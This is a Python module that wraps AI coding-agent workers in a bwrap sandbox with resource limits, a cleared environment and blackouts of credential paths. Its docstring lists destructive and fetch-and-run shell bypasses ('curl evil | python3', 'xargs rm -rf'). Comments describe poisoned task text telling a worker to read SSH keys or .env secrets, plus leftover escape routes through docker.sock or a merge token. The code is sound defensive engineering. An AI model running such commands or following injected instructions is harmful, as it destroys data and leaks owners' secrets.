"""OS-level sandbox for worker subprocesses (FS7 round-3 — primary safety layer).

The legacy ``_scan_bash`` pattern-matcher in ``agent/safety/hooks.py`` is
fundamentally exhaustible: three rounds of fix-loops produced 5+5+5 new P0
bypasses each (``bash <<<``, ``(rm -rf x)``, ``{rm,-rf,x}``, ``xargs rm -rf``,
``curl evil | python3`` …). The blacklist approach loses the arms race.

This module replaces "primary safety = pattern match" with "primary safety =
OS-level isolation". A worker is run inside a `bwrap`(1) namespace + mount
sandbox so the bash inside it physically cannot reach the orchestrator's prod
files, regardless of how cleverly the shell is invoked. ``_scan_bash`` stays
as defence-in-depth (catches the known cases, logs suspicious) but is no
longer the safety floor.

Sandbox backends are pluggable via the :class:`Sandbox` Protocol. The default
factory :func:`detect_sandbox` picks ``bwrap`` if available, else
:class:`NoSandbox` with a loud audit-log warning.

Override via ``BMAD_SANDBOX=bwrap|none`` env (test fixtures, force-disable
scenarios).
"""

from __future__ import annotations

import fnmatch
import logging
import os
import re
import shutil
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, NamedTuple, Protocol, runtime_checkable

log = logging.getLogger(__name__)

NetworkPolicy = Literal["none", "github_only", "full"]

# Env var allow-list propagated into the sandbox. Mirrors
# ``runtime.worker_spawn.ALLOWED_WORKER_ENV`` plus per-call ORCHESTRATOR_*
# context the caller passes in ``env``. Keeping a separate constant here lets
# the sandbox stay decoupled from worker_spawn import (which itself imports
# from agent.tools, a circular risk).
_SANDBOX_DEFAULT_ENV_ALLOWLIST: frozenset[str] = frozenset({
    "PATH", "HOME", "USER", "LANG", "LC_ALL", "TZ", "PWD", "SHELL", "TERM",
    # NEW-33.4 — wave-env passthrough into the bwrap-wrapped worker. Without
    # this the sandboxed ``claude -p`` resolves runs/<wave>/ via
    # worker_events.current_wave_dir() → defaults to ``runs/default/`` and
    # the orchestrator's tail loop hangs waiting on a JSONL it doesn't watch.
    # Pilot 2b root cause; mirror this in worker_spawn.ALLOWED_WORKER_ENV.
    "BMAD_CURRENT_WAVE",
})

# Env vars that the OUTER ``systemd-run --user`` cgroup wrapper needs to reach
# the user systemd manager, but that must NOT cross into the INNER sandboxed
# worker. ``worker_spawn.ALLOWED_WORKER_ENV`` forwards them to the spawned
# process so systemd-run works; ``BwrapSandbox.wrap_command`` excludes them
# from its ``--setenv`` list so the sandboxed ``claude -p`` cannot reach the
# user's D-Bus session (keyring, desktop services). claude -p provably runs
# fine without either.
_SANDBOX_INNER_ENV_BLOCKLIST: frozenset[str] = frozenset({
    "DBUS_SESSION_BUS_ADDRESS", "XDG_RUNTIME_DIR",
})

# FS9 H3+H4 + R5 P0-1 — defence-in-depth resource limits applied via ``prlimit(1)``.
# bwrap itself has no native rlimit flags; a worker that escapes the mount/net
# sandbox but stays in-process can still fork-bomb the host or fill tmpfs.
#
# CRITICAL — round 5 P0-1: `RLIMIT_NPROC` is **per-UID** in the kernel, not
# per-process-tree. A cap of 512 on a host with >512 processes under the
# orchestrator UID makes `clone()` (and thus `bwrap`) fail with EAGAIN
# *before* the namespace is created. Default raised from 512 → 16384 so the
# cap still blocks fork bombs (typical kernel hard limit ~250K) but does not
# refuse legitimate workers on busy hosts. For tighter per-cgroup isolation,
# see backlog `sandbox-cgroup-migration` (switch to `systemd-run --user
# --scope -p TasksMax=N`).
#
# FSIZE — `RLIMIT_FSIZE` caps SINGLE-FILE size, not aggregate. Workers can
# still fill /tmp by writing many files. Per-mount sizing or cgroup IO
# quotas needed for aggregate caps (deferred to sandbox-cgroup-migration).
DEFAULT_MAX_NPROC = 16384             # fork-bomb cap (per-uid count; see note above)
DEFAULT_MAX_AS_BYTES = 8 * 1024**3    # virtual memory ceiling (8 GiB)
DEFAULT_MAX_FSIZE_BYTES = 10 * 1024**3  # max single-file size (10 GiB); per-file ONLY, NOT aggregate
DEFAULT_MAX_NOFILE = 4096             # max open fds

# FS9 R5 P1-1 — minimum bounds for env overrides. A typo like
# `MAX_AS_BYTES=8589934` (8 MB instead of 8 GB) silently broke every Python
# worker; below these floors we ignore the override and log a warning.
_MIN_NPROC = 1024                     # below this bwrap clone() may fail
_MIN_AS_BYTES = 256 * 1024**2         # 256 MiB — Python interpreter needs ~50 MiB
_MIN_FSIZE_BYTES = 64 * 1024**2       # 64 MiB
_MIN_NOFILE = 256

# Env var override knobs (positive int → use if above minimum; otherwise default).
_ENV_NPROC = "BMAD_SANDBOX_MAX_NPROC"
_ENV_AS = "BMAD_SANDBOX_MAX_AS_BYTES"
_ENV_FSIZE = "BMAD_SANDBOX_MAX_FSIZE_BYTES"
_ENV_NOFILE = "BMAD_SANDBOX_MAX_NOFILE"

# Initiative #1 Task 1.3 — per-worker cgroup limits via ``systemd-run --user
# --scope``. prlimit's RLIMIT_NPROC is per-UID (see DEFAULT_MAX_NPROC note),
# so on a host that runs N parallel workers the per-UID total trivially
# exceeds the per-process cap and `clone()` fails. Cgroup-scoped limits
# (MemoryMax/CPUQuota/TasksMax) apply per scope unit instead, giving every
# worker its own enforced budget independent of host concurrency.
#
# These are layered ON TOP of prlimit (defence-in-depth). When systemd-run
# is unavailable the sandbox proceeds with prlimit only; pass
# ``BMAD_REQUIRE_CGROUP=1`` to make the cgroup layer mandatory in prod.
DEFAULT_CGROUP_MEMORY_MAX = "8G"
DEFAULT_CGROUP_CPU_QUOTA = "200%"
DEFAULT_CGROUP_TASKS_MAX = "16384"
DEFAULT_CGROUP_LIMITS: dict[str, str] = {
    "MemoryMax": DEFAULT_CGROUP_MEMORY_MAX,
    "CPUQuota": DEFAULT_CGROUP_CPU_QUOTA,
    "TasksMax": DEFAULT_CGROUP_TASKS_MAX,
}


def _systemd_run_available() -> tuple[bool, str | None]:
    """Return ``(available, path)`` for ``systemd-run --user --scope``.

    Requires both the binary on PATH *and* a usable user systemd
    (``$XDG_RUNTIME_DIR`` set + directory exists). On a host that booted
    without user-session systemd (`systemctl --user` would fail) the
    ``systemd-run --user`` invocation hangs trying to reach the user manager,
    so we refuse to prepend it rather than silently breaking spawn.
    """
    path = shutil.which("systemd-run")
    if not path:
        return False, None
    runtime_dir = os.environ.get("XDG_RUNTIME_DIR", "").strip()
    if not runtime_dir or not Path(runtime_dir).exists():
        return False, path
    return True, path


def _cgroup_required() -> bool:
    """``BMAD_REQUIRE_CGROUP=1`` (or true/yes) → fail-loud when cgroup unavailable."""
    return os.environ.get("BMAD_REQUIRE_CGROUP", "").strip().lower() in {"1", "true", "yes"}


def _env_positive_int(name: str, default: int, minimum: int | None = None) -> int:
    """Read ``name`` as positive int from env, fall back to ``default``.

    If ``minimum`` is provided and the env value is below it, log a warning
    and return ``minimum`` (FS9 R5 P1-1 — refuse silently-broken overrides).
    """
    raw = os.environ.get(name, "").strip()
    if raw.isdigit() and int(raw) > 0:
        val = int(raw)
        if minimum is not None and val < minimum:
            log.warning(
                "sandbox_rlimit_below_minimum: env=%s value=%d minimum=%d "
                "(using minimum; orchestrator would be unusable otherwise)",
                name, val, minimum,
            )
            return minimum
        return val
    return default


@runtime_checkable
class Sandbox(Protocol):
    """Pluggable OS-level isolation backend.

    Implementations wrap a command list with backend-specific isolation
    directives. The returned list is what the caller actually passes to
    ``asyncio.create_subprocess_exec`` / ``subprocess.Popen``.
    """

    @property
    def kind(self) -> str: ...

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
        worker_home_overlay: Path | None = None,
        cgroup_limits: dict[str, str] | None = None,
    ) -> list[str]:
        """Return ``cmd`` wrapped with backend isolation flags.

        Args:
            cmd: argv of the inner process (``["claude", "-p", ...]``).
            worktree: writable mount root. Anything outside is read-only or
                hidden depending on backend.
            readonly_paths: extra paths to expose read-only (e.g. shared
                source for retros). Validated as absolute.
            network: ``"none"`` isolates the netns (default — safest);
                ``"full"`` shares host net; ``"github_only"`` is currently
                treated as ``"full"`` (nftables whitelist deferred per spec
                §5 "Out of scope").
            env: env vars to inject. Caller is responsible for already
                running them through their allow-list; sandbox only
                forwards.
            worker_home_overlay: Initiative #1 Task 1.4 — per-worker HOME
                snapshot dir; when set the host's ``~/.claude*`` paths are
                replaced with same-named entries under this overlay.
                ``NoSandbox`` ignores this.
            cgroup_limits: Initiative #1 Task 1.3 — when set + systemd-run
                available, the spawn is wrapped in a per-worker
                ``systemd-run --user --scope`` with the given ``-p Key=Value``
                properties (e.g. ``{"MemoryMax": "8G", "CPUQuota": "200%"}``).
                ``NoSandbox`` ignores this.

        Returns:
            New argv list. ``NoSandbox`` returns ``cmd`` unchanged.
        """
        ...


def _resolve_target_dotgit(worktree: Path) -> Path | None:
    """Patch DD: walk up from a linked-worktree to find the main repo's ``.git/``.

    Antares + Odyssey layout is sibling: ``<target>/.worktrees/wt-<id>/`` →
    main repo at ``<target>/``, main .git dir at ``<target>/.git/``.

    A linked worktree contains ``.git`` as a *file* pointing at
    ``<main>/.git/worktrees/<id>/``; we parse the ``gitdir:`` line to find the
    main .git dir reliably regardless of layout depth.

    Returns ``None`` when the worktree's ``.git`` cannot be resolved (test
    fixtures often skip git init — bwrap should then proceed without the rw
    bind, preserving prior behavior).
    """
    dotgit = worktree / ".git"
    if dotgit.is_dir():
        # The "worktree" is itself a main repo (uncommon for production but
        # the test fixtures do this). The .git is already inside the rw bind.
        return None
    if not dotgit.is_file():
        return None
    try:
        content = dotgit.read_text(encoding="utf-8").strip()
    except OSError:
        return None
    if not content.startswith("gitdir:"):
        return None
    inner = Path(content.split(":", 1)[1].strip())
    # ``gitdir`` points at ``<main>/.git/worktrees/<id>``; walk up to
    # ``<main>/.git``. Use ``parents[1]`` so we land on the common dir.
    if not inner.is_absolute():
        inner = (worktree / inner).resolve(strict=False)
    if len(inner.parents) < 2:
        return None
    common = inner.parents[1]
    return common if common.is_dir() else None


@dataclass(frozen=True, slots=True)
class BwrapSandbox:
    """``bwrap``-backed sandbox (Bubblewrap, Flatpak's isolation primitive).

    Default policy:
      * ``--ro-bind / /`` — entire FS read-only.
      * ``--bind {worktree} {worktree}`` — worker can only write here.
      * ``--proc /proc``, ``--dev /dev`` — minimal proc/dev namespace.
      * ``--tmpfs /tmp`` — fresh empty tmpfs per invocation.
      * ``--tmpfs /sys`` — kernel info hidden (FS9 H1: LSM list, dmi, network
        topology otherwise readable via ``--ro-bind / /``).
      * ``--unshare-pid/uts/ipc/cgroup`` — namespace isolation.
      * ``--unshare-net`` iff ``network == "none"`` (default).
      * ``--die-with-parent`` — auto-cleanup if orchestrator dies.
      * ``--new-session`` — detach from controlling TTY.
      * ``--setenv K V`` per allow-listed env var; everything else stripped.

    The whole bwrap invocation is wrapped in ``prlimit(1)`` to enforce
    nproc / AS / fsize / nofile rlimits (FS9 H3+H4 — bwrap itself has no
    rlimit support).

    Read-only paths supplied via ``readonly_paths`` are additionally
    ``--ro-bind``ed. Useful for retros that read shared planning artifacts
    without granting write.
    """

    bwrap_path: str = "/usr/bin/bwrap"
    prlimit_path: str = "/usr/bin/prlimit"
    kind: str = "bwrap"

    def __post_init__(self) -> None:
        # FS9 H3+H4 — prlimit is a hard requirement; rlimits are the only
        # DoS defence inside the sandbox. Refuse to construct without it
        # rather than silently dropping resource caps.
        if not Path(self.prlimit_path).exists() and shutil.which("prlimit") is None:
            raise RuntimeError(
                f"prlimit not found at {self.prlimit_path!r} or on PATH; "
                "install util-linux (apt install util-linux) — required for "
                "sandbox resource limits."
            )

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
        worker_home_overlay: Path | None = None,
        cgroup_limits: dict[str, str] | None = None,
    ) -> list[str]:
        """Wrap ``cmd`` with bwrap isolation + optional cgroup + HOME overlay.

        Initiative #1 Task 1.3/1.4 additions:

        * ``worker_home_overlay`` — when supplied, the host's ``~/.claude``,
          ``~/.claude.json``, ``~/.local/share/claude`` binds are replaced
          with the same-named paths under this directory. Caller is
          responsible for snapshotting/creating the overlay (see
          :func:`runtime.worker_spawn._create_isolated_home`). Parallel
          workers each get their own overlay so they no longer race on the
          host's shared Claude state files.

        * ``cgroup_limits`` — when supplied and ``systemd-run --user --scope``
          is available, prepend a transient scope unit with the given
          ``-p Key=Value`` properties (typical: ``MemoryMax``, ``CPUQuota``,
          ``TasksMax``). The scope wraps prlimit+bwrap so the inner process
          tree is bound by per-cgroup quotas. If systemd-run is unavailable
          and ``BMAD_REQUIRE_CGROUP=1`` is set, raises; otherwise logs a
          warning and continues with prlimit only.
        """
        if not cmd:
            raise ValueError("cmd must be non-empty")
        wt_abs = Path(worktree).resolve(strict=False)
        if not wt_abs.is_absolute():
            raise ValueError(f"worktree must be absolute: {worktree!r}")
        overlay_abs: Path | None = None
        if worker_home_overlay is not None:
            if not Path(worker_home_overlay).is_absolute():
                raise ValueError(
                    f"worker_home_overlay must be absolute: {worker_home_overlay!r}"
                )
            overlay_abs = Path(worker_home_overlay).resolve(strict=False)
            if not overlay_abs.exists():
                raise FileNotFoundError(
                    f"worker_home_overlay does not exist: {overlay_abs}"
                )

        wrapped: list[str] = [
            self.bwrap_path,
            "--die-with-parent",
            "--new-session",
            "--ro-bind", "/", "/",
            "--proc", "/proc",
            "--dev", "/dev",
            "--tmpfs", "/tmp",  # noqa: S108 — bwrap mount point inside the sandbox namespace, not a host path
            "--tmpfs", "/sys",  # FS9 H1 — hide kernel info (LSMs, dmi, network)
            # FS9 R5 P0-2 — block individual /proc kernel fingerprint files.
            # ``/proc/version`` is needed by the Claude CLI (bun runtime reads
            # it on startup) so it stays exposed; the rest get redacted.
            "--ro-bind", "/dev/null", "/proc/cmdline",
            "--ro-bind", "/dev/null", "/proc/modules",
            "--ro-bind", "/dev/null", "/proc/kallsyms",
            "--ro-bind", "/dev/null", "/proc/cpuinfo",
            "--ro-bind", "/dev/null", "/proc/meminfo",
            "--bind", str(wt_abs), str(wt_abs),
            "--chdir", str(wt_abs),
            # Patch DD 2026-05-18: bind the parent repo's ``.git`` directory
            # rw so the worker can ``git commit`` from inside the worktree.
            # A linked worktree's ``.git`` file points at
            # ``<main>/.git/worktrees/<name>/`` (HEAD + index) and shares
            # ``<main>/.git/refs/heads/`` + ``<main>/.git/objects/`` with the
            # main repo. Without this bind, ``--ro-bind / /`` exposes ``.git``
            # read-only → ``git commit`` fails EROFS and Stage 5 ends with
            # uncommitted changes (silent-failure or manual close).
            #
            # Trade-off: the worker can rewrite ``refs/heads/master`` of the
            # main repo. Mitigated by branch isolation (worker only operates
            # on ``feature/<story>``) + integration-branch merge gate; if
            # threat model tightens, narrow this to just
            # ``worktrees/<name>/``, ``refs/heads/feature/<story>``,
            # ``objects/`` and ``logs/refs/heads/feature/<story>``.
            *(
                ["--bind", str(_resolve_target_dotgit(wt_abs)), str(_resolve_target_dotgit(wt_abs))]
                if _resolve_target_dotgit(wt_abs) is not None
                else []
            ),
            # Review finding H-1 — explicit blackouts on sensitive host paths.
            # ``--ro-bind / /`` exposes every readable file to the worker; a
            # poisoned story description ("read /home/server/crm/.env for
            # context") could exfil prod secrets, /etc/shadow, other users'
            # homes, or this user's auth tokens. Blackout = bind ``/dev/null``
            # over the path so reads return zero bytes regardless of how the
            # worker resolves the path. Order matters — these come AFTER the
            # blanket ``--ro-bind / /`` and BEFORE the writable workspace bind
            # so they override the open mount but never shadow legitimate work.
        ]
        # H-1 sensitive-path blackouts. Directories get an empty ``--tmpfs``
        # mount (writable but invisible to host); files get ``--ro-bind
        # /dev/null`` (zero-byte read). Tolerates missing host paths so the
        # rule list is identical across environments — test hosts without
        # ``/home/server/crm`` simply skip that entry.
        #
        # H-A security follow-up (Phase 4B re-review): expand to cover every
        # credential store and orchestrator-internal directory readable via
        # the ``--ro-bind / /`` mount. A poisoned story description that
        # tells the worker to ``cat ~/.ssh/id_rsa`` or
        # ``cat ~/.aws/credentials`` would otherwise exfiltrate to the
        # Anthropic API on the next reasoning turn (stdout JSONL flows back
        # to the parent and into the next prompt). Blackouts are applied
        # before the claude_subpaths binds below, so ``~/.claude/`` /
        # ``~/.claude.json`` / ``~/.local/share/claude/`` (worker-required)
        # remain accessible while everything else under $HOME is invisible.
        _host_home = os.path.expanduser("~")
        # Orchestrator's own state dir (this very repo's ``.claude/``) holds
        # the ``main-merge-token.json`` single-gate that authorises a merge
        # to ``main``. Without an explicit blackout the worker can ``cat``
        # the token and forge a merge. Resolve via __file__ rather than the
        # configured ``settings.orchestrator_home`` to avoid importing
        # ``config`` (circular risk) and to cover dev installs that override
        # ``orchestrator_home`` while still running from this source tree.
        _orchestrator_state = (
            Path(__file__).resolve().parents[3] / ".claude"
        )
        _SANDBOX_BLACKOUT_PATHS = (
            # System / other-user secrets (S10 H-1 baseline).
            "/home/server/crm",
            "/etc/shadow",
            "/etc/gshadow",
            "/etc/sudoers",
            "/etc/sudoers.d",
            "/etc/ssh",
            "/root",
            # SSH keys, known_hosts, agent socket directory.
            f"{_host_home}/.ssh",
            # Cloud / registry credential stores.
            f"{_host_home}/.aws",
            f"{_host_home}/.gnupg",
            f"{_host_home}/.netrc",
            f"{_host_home}/.docker",
            f"{_host_home}/.kube",
            # Git credential helpers (the actual token stores; we
            # deliberately leave ``~/.gitconfig`` and ``~/.config/git``
            # READABLE so worker commits still resolve user.email/name —
            # see Phase 4B re-review HIGH "blackout shadows git identity").
            f"{_host_home}/.git-credentials",
            f"{_host_home}/.config/git/credentials",
            # CLI tool auth stores (github / gitlab / gcloud / azure).
            f"{_host_home}/.config/gh",
            f"{_host_home}/.config/gcloud",
            f"{_host_home}/.config/azure",
            # Package / language ecosystem credential stores.
            f"{_host_home}/.npmrc",
            f"{_host_home}/.pypirc",
            f"{_host_home}/.cargo/credentials.toml",
            # Secret managers / infra credential stores.
            f"{_host_home}/.vault-token",
            f"{_host_home}/.config/op",
            f"{_host_home}/.config/sops",
            f"{_host_home}/.config/pulumi",
            f"{_host_home}/.terraform.d/credentials.tfrc.json",
            f"{_host_home}/.config/helm/registry/config.json",
            f"{_host_home}/.password-store",
            # Desktop secret stores (libsecret / gnome-keyring) — git
            # credential.helper=libsecret reads from ~/.local/share/keyrings.
            f"{_host_home}/.local/share/keyrings",
            f"/run/user/{os.getuid()}/keyring",
            f"/run/user/{os.getuid()}/gnupg",
            # Orchestrator's own state (state.db, tokens, memory, runs).
            str(_orchestrator_state),
            f"{_host_home}/.bmad-orchestrator",
            f"{_host_home}/.config/bmad-orchestrator",
        )
        for blackout in _SANDBOX_BLACKOUT_PATHS:
            blackout_path = Path(blackout)
            if not blackout_path.exists():
                continue
            if blackout_path.is_dir():
                wrapped += ["--tmpfs", blackout]
            elif blackout_path.is_file():
                wrapped += ["--ro-bind", "/dev/null", blackout]
            else:
                # Sockets / devices / FIFOs / broken symlinks: bwrap cannot
                # mount ``/dev/null`` over a non-regular file, and broken
                # symlinks degrade silently. Log so operators notice when a
                # blackout entry stops landing (e.g. a credential store
                # moved/deleted between deploys). NOTE: unix sockets like
                # ``/var/run/docker.sock`` are NOT blacked out by this loop —
                # if the orchestrator UID is in the ``docker`` group, the
                # worker can still ``connect()`` to the daemon and pivot to
                # host root. Mitigate at host level (drop docker group) or
                # via user namespace; tracked in backlog.
                log.warning(
                    "sandbox blackout %s skipped — path is not a regular "
                    "file or directory (socket/device/broken symlink)",
                    blackout,
                )
        wrapped += [
            "--unshare-pid",
            "--unshare-uts",
            "--unshare-ipc",
            "--unshare-cgroup-try",
            # S5 AC8/AC10 (#20 sev-3 + T11 sev-3): unshare user namespace so
            # syscalls like mount -t fuse return EPERM and the worker runs in
            # its own UID namespace. Flag silently skips when kernel disables
            # unprivileged_userns_clone (boot-check in _cmd_wrap emits a
            # `user_namespace_unshare_unavailable` audit warn in that case).
            "--unshare-user-try",
        ]
        # Opt-in UID remap (AC10). Default keeps host UID to avoid surprising
        # existing tests / git commit identity. Set BMAD_SANDBOX_UID_REMAP=1
        # to map inner uid/gid → 0 inside the user namespace.
        if os.environ.get("BMAD_SANDBOX_UID_REMAP", "").strip() == "1":
            wrapped += ["--uid", "0", "--gid", "0"]

        # Claude CLI state: the binary writes config to ~/.claude.json,
        # plugin manifest to ~/.claude/, and version state to
        # ~/.local/share/claude/. Without writable mounts the worker
        # `claude -p` exits with EROFS / EACCES on startup.
        #
        # Initiative #1 Task 1.4: when ``worker_home_overlay`` is supplied,
        # bind from the overlay copy at <overlay>/.claude (etc) over the
        # host paths instead. The bwrap mount makes the worker see its
        # private snapshot at the same destination path the claude binary
        # resolves via $HOME — so no env change required.
        home = Path(os.path.expanduser("~"))
        # Per-worker overlay isolates ONLY mutable claude state (session files,
        # creds, lock/SQLite stores). ``~/.local/share/claude`` holds the
        # claude binary install (``versions/<v>/`` — the actual executable
        # ``~/.local/bin/claude`` symlinks into). It is immutable + shared and
        # MUST bind from the real host: an empty overlay copy would shadow the
        # binary → ``bwrap: execvp .../claude: No such file or directory``.
        overlay_claude_subpaths = (
            (".claude",),
            (".claude.json",),
        )
        host_only_claude_subpaths = (
            (".local", "share", "claude"),
        )
        for parts in overlay_claude_subpaths:
            host_path = home.joinpath(*parts)
            if overlay_abs is not None:
                src = overlay_abs.joinpath(*parts)
                # Only bind when overlay has the path; missing entries fall
                # through to no bind (the worker will create them in the
                # overlay's writable tmpfs at /tmp via $HOME-resolution).
                if src.exists():
                    wrapped += ["--bind", str(src), str(host_path)]
            elif host_path.exists():
                wrapped += ["--bind", str(host_path), str(host_path)]
        for parts in host_only_claude_subpaths:
            host_path = home.joinpath(*parts)
            if host_path.exists():
                wrapped += ["--bind", str(host_path), str(host_path)]

        if network == "none":
            wrapped += ["--unshare-net"]
        # network="full" or "github_only" → share host netns (nftables
        # whitelist for github_only is deferred per spec §5).

        if readonly_paths:
            for p in readonly_paths:
                p_abs = Path(p).resolve(strict=False)
                if not p_abs.is_absolute():
                    raise ValueError(f"readonly_path must be absolute: {p!r}")
                wrapped += ["--ro-bind", str(p_abs), str(p_abs)]

        # Env propagation: clear ALL inherited env first, then forward only
        # the default allow-list + caller-provided ``env``. Without
        # ``--clearenv`` bwrap inherits the parent's env (incl.
        # ANTHROPIC_API_KEY etc), defeating the env-allowlist contract.
        wrapped += ["--clearenv"]
        merged_env: dict[str, str] = {
            k: os.environ[k]
            for k in _SANDBOX_DEFAULT_ENV_ALLOWLIST
            if k in os.environ
        }
        if env:
            merged_env.update(env)
        for k, v in merged_env.items():
            # Exclude session-bus vars from the inner sandbox — they are
            # forwarded to the OUTER systemd-run wrapper only (see
            # _SANDBOX_INNER_ENV_BLOCKLIST).
            if k in _SANDBOX_INNER_ENV_BLOCKLIST:
                continue
            wrapped += ["--setenv", k, v]

        wrapped += ["--"]
        wrapped += list(cmd)

        # FS9 H3+H4 — prepend prlimit(1) outside the bwrap invocation so the
        # rlimits apply to the entire process tree (bwrap forks the inner
        # command; prlimit applies via setrlimit before exec, inherited by
        # all descendants).
        rlimit_wrapper = [
            self.prlimit_path,
            f"--nproc={_env_positive_int(_ENV_NPROC, DEFAULT_MAX_NPROC, _MIN_NPROC)}",
            f"--as={_env_positive_int(_ENV_AS, DEFAULT_MAX_AS_BYTES, _MIN_AS_BYTES)}",
            f"--fsize={_env_positive_int(_ENV_FSIZE, DEFAULT_MAX_FSIZE_BYTES, _MIN_FSIZE_BYTES)}",
            f"--nofile={_env_positive_int(_ENV_NOFILE, DEFAULT_MAX_NOFILE, _MIN_NOFILE)}",
            "--",
        ]
        full = rlimit_wrapper + wrapped

        if cgroup_limits:
            cgroup_prefix = _build_cgroup_prefix(cgroup_limits, worktree=wt_abs)
            if cgroup_prefix:
                full = cgroup_prefix + full
        return full


def _scope_unit_name(worktree: Path) -> str:
    """Build a deterministic-but-unique systemd scope unit name per spawn.

    Format: ``bmad-worker-<wt_basename>-<pid>-<monotonic_ms>.scope``. systemd
    requires names ≤256 chars and within ``[A-Za-z0-9:_.\\-]``; we sanitise
    the worktree basename to satisfy that and keep the human-readable hint.
    """
    import re
    import time
    base = re.sub(r"[^A-Za-z0-9_.-]", "_", worktree.name)[:64] or "wt"
    return f"bmad-worker-{base}-{os.getpid()}-{int(time.monotonic_ns() // 1_000_000)}"


def _build_cgroup_prefix(
    limits: dict[str, str], *, worktree: Path
) -> list[str] | None:
    """Return ``systemd-run --user --scope -p ... --`` argv prefix or ``None``.

    Returns ``None`` (silent skip) when ``systemd-run`` is unavailable AND
    ``BMAD_REQUIRE_CGROUP`` is unset. Raises ``RuntimeError`` when required
    but unavailable.
    """
    available, path = _systemd_run_available()
    if not available:
        if _cgroup_required():
            raise RuntimeError(
                "BMAD_REQUIRE_CGROUP=1 set but systemd-run --user is "
                "unavailable on this host (need systemd user manager + "
                "$XDG_RUNTIME_DIR). Install systemd or unset the env var."
            )
        log.warning(
            "cgroup_limits requested but systemd-run --user unavailable; "
            "proceeding with prlimit only (set BMAD_REQUIRE_CGROUP=1 to "
            "make this fatal in prod)"
        )
        return None
    assert path is not None
    prefix: list[str] = [
        path,
        "--user",
        "--scope",
        "--quiet",
        f"--unit={_scope_unit_name(worktree)}.scope",
    ]
    for key, value in limits.items():
        # systemd-run -p KEY=VALUE — values are passed verbatim to systemd
        # property parsing; we keep this minimal (no shell expansion).
        prefix += ["-p", f"{key}={value}"]
    prefix += ["--"]
    return prefix


@dataclass(frozen=True, slots=True)
class NoSandbox:
    """Fallback when no OS-level sandbox is available.

    ``wrap_command`` returns the command verbatim. On construction the
    factory logs a warning + emits an ``audit`` event so any prod
    deployment without ``bwrap`` is conspicuously flagged.
    """

    kind: str = "none"

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
        worker_home_overlay: Path | None = None,
        cgroup_limits: dict[str, str] | None = None,
    ) -> list[str]:
        if not cmd:
            raise ValueError("cmd must be non-empty")
        return list(cmd)


def _emit_no_sandbox_audit(reason: str) -> None:
    """Best-effort audit event when falling back to NoSandbox. Failures here
    must not block worker spawn — audit is observability, not gating."""
    try:
        from bmad_orchestrator.agent.safety.audit import record_audit
        record_audit(
            "sandbox_unavailable",
            sandbox_kind="none",
            reason=reason,
            severity="warning",
        )
    except Exception as exc:
        log.warning("audit emit failed for sandbox fallback: %s", exc)


_DISABLE_CONFIRMATION_TOKEN = "yes-i-accept-risk"  # noqa: S105 — not a secret, public confirmation token


def _require_sandbox() -> bool:
    """``BMAD_REQUIRE_SANDBOX=1`` (or true/yes) → fail-loud on NoSandbox.

    Production launchers (systemd units) MUST set this so a missing bwrap
    binary blocks startup instead of silently degrading to no isolation.
    """
    return os.environ.get("BMAD_REQUIRE_SANDBOX", "").strip().lower() in {"1", "true", "yes"}


def _disable_confirmed() -> bool:
    """Two-key confirmation for ``BMAD_SANDBOX=none``.

    Operator must set ``BMAD_SANDBOX_DISABLE_CONFIRMED=yes-i-accept-risk`` in
    the same env as ``BMAD_SANDBOX=none``. Prevents a stray child process or
    a misconfigured systemd drop-in from disabling the sandbox unnoticed.
    """
    return os.environ.get("BMAD_SANDBOX_DISABLE_CONFIRMED", "").strip() == _DISABLE_CONFIRMATION_TOKEN


def _enforce_require_sandbox(result: Sandbox, *, reason: str) -> None:
    """Raise if BMAD_REQUIRE_SANDBOX=1 and ``result`` is not a real sandbox."""
    if _require_sandbox() and not isinstance(result, BwrapSandbox):
        raise RuntimeError(
            "BMAD_REQUIRE_SANDBOX=1 set but no sandbox backend available "
            f"(reason={reason}); refusing to spawn workers. Install bwrap "
            "(apt install bubblewrap) or unset BMAD_REQUIRE_SANDBOX."
        )


def detect_sandbox() -> Sandbox:
    """Pick the best sandbox backend available.

    Order:
      1. ``BMAD_SANDBOX`` env override (``bwrap`` | ``none``).
         - ``none`` requires ``BMAD_SANDBOX_DISABLE_CONFIRMED=yes-i-accept-risk``
           (FS9 H6); else raises RuntimeError.
      2. ``shutil.which("bwrap")`` → :class:`BwrapSandbox`.
      3. fallback → :class:`NoSandbox` (loud audit warning).

    FS9 H5: if ``BMAD_REQUIRE_SANDBOX=1`` is set and the resolved backend is
    not a real sandbox (i.e. NoSandbox), raise RuntimeError. Production
    deployments MUST set this env var in their systemd unit / launcher.
    """
    override = os.environ.get("BMAD_SANDBOX", "").strip().lower()
    if override == "none":
        if not _disable_confirmed():
            raise RuntimeError(
                "BMAD_SANDBOX=none requires BMAD_SANDBOX_DISABLE_CONFIRMED="
                f"{_DISABLE_CONFIRMATION_TOKEN}. Disabling sandbox in "
                "production is dangerous — set the confirmation env var or "
                "remove BMAD_SANDBOX=none."
            )
        # H5 takes precedence over H6 confirmation — REQUIRE wins over override.
        result: Sandbox = NoSandbox()
        _enforce_require_sandbox(result, reason="env_override_none_confirmed")
        log.warning("BMAD_SANDBOX=none confirmed — worker isolation DISABLED")
        _emit_no_sandbox_audit("env_override")
        return result
    if override == "bwrap":
        path = shutil.which("bwrap")
        if not path:
            log.error("BMAD_SANDBOX=bwrap but bwrap not found in PATH")
            fallback: Sandbox = NoSandbox()
            _enforce_require_sandbox(fallback, reason="bwrap_override_missing_binary")
            _emit_no_sandbox_audit("bwrap_override_missing_binary")
            return fallback
        return BwrapSandbox(bwrap_path=path)

    path = shutil.which("bwrap")
    if path:
        return BwrapSandbox(bwrap_path=path)

    log.error(
        "bwrap not found on PATH — falling back to NoSandbox. "
        "Worker subprocess isolation DISABLED. Install `bubblewrap` "
        "(apt install bubblewrap) to restore primary safety layer."
    )
    fallback = NoSandbox()
    _enforce_require_sandbox(fallback, reason="bwrap_not_installed")
    _emit_no_sandbox_audit("bwrap_not_installed")
    return fallback


# ─────────────────────────────────────────────────────────────────────────────
# Phase 4 hardening #4 — Permission deny-list (third layer of defence)
#
